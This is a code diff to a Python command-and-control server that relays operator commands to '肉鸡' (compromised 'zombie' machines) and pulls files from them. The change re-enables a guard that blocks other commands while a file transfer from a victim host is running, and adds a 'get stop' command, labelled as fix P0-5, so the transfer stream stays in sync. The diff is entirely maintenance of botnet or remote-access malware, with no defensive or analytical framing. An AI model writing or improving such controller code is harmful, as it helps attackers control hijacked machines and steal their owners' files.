@@ -495,13 +495,14 @@ def handle_client_a(client, address):
                         rouji_commands = decoded_data.split(" #> ")
                         rouji_id = int(rouji_commands[0])
 
-                        # # 检查该肉鸡是否正在传输文件
-                        # if transfer_states.get(rouji_id, {}).get("in_transfer", False):
-                        #     state = transfer_states[rouji_id]
-                        #     progress = state["received_size"] / state["file_size"] * 100
-                        #     busy_msg = f"该肉鸡正在进行文件传输，进度: {progress:.1f}% ({state['received_size']}/{state['file_size']} 字节)，请稍后再试或使用 'get stop' 停止传输".encode("UTF-8")
-                        #     send_result(client, busy_msg)
-                        #     continue
+                        # 忙守卫（P0-5）：该肉鸡正在文件传输时，拒绝同肉鸡的其他命令，
+                        # 避免普通命令的 recv_result 把文件字节流当成下一帧长度前缀，
+                        # 导致 C 端协议流永久失步。仅放行 "get stop"（用于停止当前传输）。
+                        if transfer_states.get(rouji_id, {}).get("in_transfer", False) and rouji_commands[1].strip() != "get stop":
+                            _st = transfer_states[rouji_id]
+                            _pct = _st["received_size"] / _st["file_size"] * 100 if _st.get("file_size") else 0
+                            send_result(client, f"该肉鸡正在传输文件（{_pct:.1f}%，{_st['received_size']}/{_st['file_size']} 字节），请稍后，或用 '{rouji_id} #> get stop' 停止传输".encode("UTF-8"))
+                            continue
 
                         # 判断是不是exit的rouji退出命令
                         if "exit" == rouji_commands[1]:
@@ -509,14 +510,14 @@ def handle_client_a(client, address):
                             Client_roujis[rouji_id].send("exit".encode("UTF-8"))
                             Client_roujis[rouji_id].close()
                         elif "get" in rouji_commands[1] and rouji_commands[1].startswith("get "):
-                            # # 检查是否是停止传输命令
-                            # if rouji_commands[1] == "get stop":
-                            #     if transfer_states.get(rouji_id, {}).get("in_transfer", False):
-                            #         transfer_states[rouji_id]["in_transfer"] = False
-                            #         send_result(client, "文件传输已停止".encode("UTF-8"))
-                            #     else:
-                            #         send_result(client, "当前没有进行中的文件传输".encode("UTF-8"))
-                            #     continue
+                            # 停止传输命令：置 in_transfer=False，让后台接收线程尽快结束
+                            if rouji_commands[1].strip() == "get stop":
+                                if transfer_states.get(rouji_id, {}).get("in_transfer", False):
+                                    transfer_states[rouji_id]["in_transfer"] = False
+                                    send_result(client, f"肉鸡 {rouji_id} 文件传输已请求停止".encode("UTF-8"))
+                                else:
+                                    send_result(client, "当前没有进行中的文件传输".encode("UTF-8"))
+                                continue
 
                             # 实现文件上传的接收操作（非阻塞优化版）
                             try:
